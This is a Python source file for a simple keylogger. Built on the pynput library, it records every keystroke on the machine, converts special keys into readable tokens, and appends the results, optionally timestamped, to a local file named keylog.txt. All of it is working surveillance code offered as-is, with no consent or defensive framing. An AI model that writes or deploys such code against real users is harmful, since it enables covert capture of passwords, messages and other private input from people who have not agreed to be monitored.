import pynput
from pynput.keyboard import Key, Listener

from time import localtime, strftime


class Keylogger:
    def __init__(self, log_filename="keylog.txt", encoding="utf-8", save_after=10, with_time=True):
        self.log_filename = log_filename
        self.encoding = encoding
        self.save_after = save_after
        self.count = 0
        self.with_time = with_time
        self.keys_raw = []
        self.keys_formated = []

    def on_press(self, key):
        print(f"{key} pressed")
        self.keys_raw.append(key)
        self.count += 1
        if self.count >= self.save_after:
            self.save_to_file()
            self.count = 0

    def on_release(self, key):
        pass

    def run(self):
        try:
            with Listener(on_press = self.on_press, on_release = self.on_release) as listener:
                listener.join()
        except:
            pass
    
    def format(self):
        for key in self.keys_raw:
            k = str(key).replace("'", "")
            if k.find("Key") == -1:
                self.keys_formated.append(k)
            elif k.find("backspace") > 0:
                self.keys_formated.append(" [backspace] ")
            elif k.find("space") > 0:
                self.keys_formated.append(" ")
            elif k.find("enter") > 0:
                self.keys_formated.append("\n")
            elif k.find("tab") > 0:
                self.keys_formated.append("\t")
            else:
                self.keys_formated.append(f" [{k[4:]}] ")

    def save_to_file(self):
        self.format()
        with open(self.log_filename, "ab") as fh:
            if self.with_time == True:
                t = "\n\nTIME: [ " + strftime("%m/%d/%Y, %H:%M:%S", localtime()) + " ]\n"
                fh.write(t.encode(self.encoding))
            fh.write(''.join(self.keys_formated).encode(self.encoding))
            self.keys_formated = []
            self.keys_raw = []


if __name__ == '__main__':
    keylogger = Keylogger(save_after=1, with_time=False)
    keylogger.run()
